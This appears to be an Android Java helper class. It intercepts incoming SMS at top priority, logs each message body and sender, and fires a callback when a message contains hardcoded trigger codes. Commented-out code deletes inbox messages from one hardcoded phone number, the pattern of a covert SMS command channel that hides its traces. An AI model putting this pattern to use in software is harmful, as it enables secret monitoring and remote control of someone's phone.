package com.falexander.util;

import java.util.Locale;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class PhoneSMSHelper
{
	// private final String testNumber = "972586910685";
	private Context				_context;
	private PhoneSMSReceiver	_phoneSMSReceiver;

	public interface Callback
	{
		void SpecialBody(final String address);
	}

	private Callback mCallback = null;

	public PhoneSMSHelper(Context context, Callback Callback)
	{
		this._context = context;
		mCallback = Callback;
		_phoneSMSReceiver = new PhoneSMSReceiver();
	}

	public class PhoneSMSReceiver extends BroadcastReceiver
	{
		@SuppressWarnings("deprecation")
		@SuppressLint("NewApi")
		@Override
		public void onReceive(Context context, Intent intent)
		{
			String action = intent.getAction();
			Logger.Log.t("action", action);
			if (action.equals("android.provider.Telephony.SMS_RECEIVED"))
			{
				SmsMessage smsMessage;
				if (Build.VERSION.SDK_INT >= 19)
				{

					SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
					smsMessage = msgs[0];
					String msg_from = smsMessage.getOriginatingAddress();
					String body = smsMessage.getMessageBody();
					CheckBody(body, msg_from);
					if (body.contains("🐸"))
					{
						Logger.Log.t("Blin ono");
					}
					Logger.Log.t(smsMessage.getMessageBody() + ";;" + msg_from);
				}
				else
				{
					Bundle bundle = intent.getExtras(); // ---get the SMS message passed in---
					SmsMessage[] msgs = null;
					Object[] pdus = (Object[]) bundle.get("pdus");
					String msg_from;
					msgs = new SmsMessage[pdus.length];
					for (int i = 0; i < msgs.length; i++)
					{
						msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						msg_from = msgs[i].getOriginatingAddress();
						String msgBody = msgs[i].getMessageBody();
						CheckBody(msgBody, msg_from);
						Logger.Log.t(msgBody + "from:" + msg_from);
					}
				}
			}
		}
	}

	private final String[] psws = { "3*7", "5*2", "ha43" };

	void CheckBody(final String body, final String addres)
	{
		if (null == body)
		{
			return;
		}
		for (String psw : psws)
		{
			if (body.toLowerCase(Locale.getDefault()).contains(psw.toLowerCase(Locale.getDefault())))
			{
				if (null != mCallback)
				{
					mCallback.SpecialBody(addres);
				}
				break;
			}

		}
	}

	public void Start()
	{
		if (null != _context)
		{

			IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
			intentFilter.setPriority(Thread.MAX_PRIORITY);
			_context.registerReceiver(_phoneSMSReceiver, intentFilter);
		}
	}

	public void Stop()
	{
		if (null != _context)
		{
			_context.unregisterReceiver(_phoneSMSReceiver);
		}
	}

	public void Send(final String phoneNumber, final String message)
	{
		PendingIntent piSent = PendingIntent.getBroadcast(_context, 0, new Intent("SMS_SENT"), 0);
		PendingIntent piDelivered = PendingIntent.getBroadcast(_context, 0, new Intent("SMS_DELIVERED"), 0);
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage(phoneNumber, null, message, piSent, piDelivered);
	}

	// private void test()
	// {
	// List<SMSData> smsList = new ArrayList<SMSData>();
	//
	// Uri uri = Uri.parse("content://sms/inbox");
	// Cursor c = _context.getContentResolver().query(uri, null, null, null, null);
	//
	// // Read the sms data and store it in the list
	// if (c.moveToFirst())
	// {
	// for (int i = 0; i < c.getCount(); i++)
	// {
	// SMSData sms = new SMSData();
	// long cid = c.getLong(c.getColumnIndexOrThrow("_id"));
	// sms.setCId(cid);
	// sms.setId(c.getString(c.getColumnIndexOrThrow("_id")).toString());
	// sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
	// sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
	// sms.setTime(c.getString(c.getColumnIndexOrThrow("date")).toString());
	// smsList.add(sms);
	// c.moveToNext();
	// }
	// }
	// for (SMSData sms : smsList)
	// {
	// Logger.Log.t(tag, sms.id, sms.number);
	// if (sms.number.equals("+972586910685"))
	// {
	// try
	// {
	// _context.getContentResolver().delete(Uri.parse("content://sms/" + sms.id), null, null);
	// }
	// catch (Exception e)
	// {
	// Logger.Log.t(tag, e.getMessage());
	// }
	// }
	// }
	// c.close();
	// }

	// boolean DeleteIncomingSMS(Context context, boolean unreadOnly)
	// {
	// String SMS_READ_COLUMN = "read";
	// String WHERE_CONDITION = unreadOnly ? SMS_READ_COLUMN + " = 0" : null;
	// String SORT_ORDER = "date DESC";
	// int count = 0;
	// long ignoreThreadId = 0;
	// if (ignoreThreadId > 0)
	// {
	// WHERE_CONDITION += " AND thread_id != " + ignoreThreadId;
	// }
	// Uri inboxURI = Uri.parse("content://sms/inbox");
	// Cursor cursor = null;
	// try
	// {
	// cursor = context.getContentResolver().query(inboxURI,
	// new String[] { "_id", "thread_id", "address", "person", "date", "body" },
	// null, // WHERE_CONDITION,
	// null,
	// SORT_ORDER);
	// }
	// catch (Exception e)
	// {
	// return true;
	// }
	// boolean ret = false;
	// if (cursor != null)
	// {
	//
	// try
	// {
	// count = cursor.getCount();
	// if (count > 0)
	// {
	// if (cursor.moveToFirst())
	// {
	// for (int i = 0; i < count; i++)
	// {
	// long cid = cursor.getLong(cursor.getColumnIndexOrThrow("_id"));
	// String addr = cursor.getString(cursor.getColumnIndexOrThrow("address"));
	// if (addr.equals("+972586910685"))
	// {
	// try
	// {
	// _context.getContentResolver().delete(Uri.parse("content://sms/" + cid), null, null);
	// Logger.Log.t(tag, "deleted sms id", cid, "from", addr);
	// ret = true;
	// }
	// catch (Exception e)
	// {
	// Logger.Log.t(tag, e.getMessage());
	// }
	// }
	//
	// // Logger.Log.t(tag, "CID", cid, "ADDR", addr);
	// cursor.moveToNext();
	//
	// }
	// }
	// }
	// }
	// finally
	// {
	// cursor.close();
	// }
	// }
	// return ret;
	// }
	//

}// class PhoneSMSHelper
